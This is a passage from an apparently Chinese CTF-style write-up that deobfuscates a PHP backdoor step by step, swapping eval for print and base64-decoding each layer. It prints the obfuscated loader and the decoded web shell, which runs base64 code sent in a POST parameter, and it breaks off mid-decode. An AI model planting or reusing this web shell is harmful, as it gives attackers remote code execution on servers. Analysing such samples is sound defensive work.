style="color:#e6db74">&#34;F&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;b&#34;</span>, <span style="color:#e6db74">&#34;L&#34;</span>, <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;^&#34;</span>, <span style="color:#e6db74">&#34;,&#34;</span>, <span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#e6db74">&#34;l&#34;</span>, <span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;d&#34;</span>, <span style="color:#e6db74">&#34;`&#34;</span>, <span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#34;N&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;[&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;J&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;A&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#34;k&#34;</span>, <span style="color:#e6db74">&#34;o&#34;</span>, <span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;#&#34;</span>, <span style="color:#e6db74">&#34;i&#34;</span>, <span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#e6db74">&#34;Y&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;j&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">&#34;K&#34;</span>, <span style="color:#e6db74">&#34;c&#34;</span>, <span style="color:#e6db74">&#34;B&#34;</span>, <span style="color:#e6db74">&#34;t&#34;</span>, <span style="color:#e6db74">&#34;R&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;e&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>);
	$order<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">47</span>);
	$do_me<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>;
	<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">count</span>($order);$i<span style="color:#f92672">++</span>){
		$do_me<span style="color:#f92672">=</span>$do_me<span style="color:#f92672">.</span>$terms[$order[$i]];
	}
	<span style="color:#66d9ef">eval</span>($do_me); 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>用国赛学来的方法，直接把 <code>eval</code> 改成 <code>print</code> 然后放在线环境运行一下，得到第二份脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_<span style="color:#f92672">=</span> <span style="color:#a6e22e">\</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\</span><span style="color:#960050;background-color:#1e0010">&#39;</span>;
$__<span style="color:#f92672">=</span><span style="color:#a6e22e">\</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\</span><span style="color:#960050;background-color:#1e0010">&#39;</span>;
$___<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65</span><span style="color:#e6db74">&#34;</span>;
<span style="color:#66d9ef">eval</span>($___($__));
</code></pre></div><p>这次好像在线环境运行不了，看一下字符串都是什么，复制到python里，发现 <code>$___</code> 是 <code>base64_decode</code></p>
<p>于是把 <code>$__</code> 解码一下，得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$code<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>($_);<span style="color:#66d9ef">eval</span>($code);
</code></pre></div><p>所以只要解码 <code>$_</code> 就可以了，得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">49</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">49</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">68</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x4F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">84</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">116</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x68</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x74</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x44</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x4F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x54</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6A</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x76</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x61</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x35</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x63</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x72</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x70</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x41</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">84</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x66</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6C</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x72</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x65</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x44</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">65</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x53</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">72</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">111</span><span 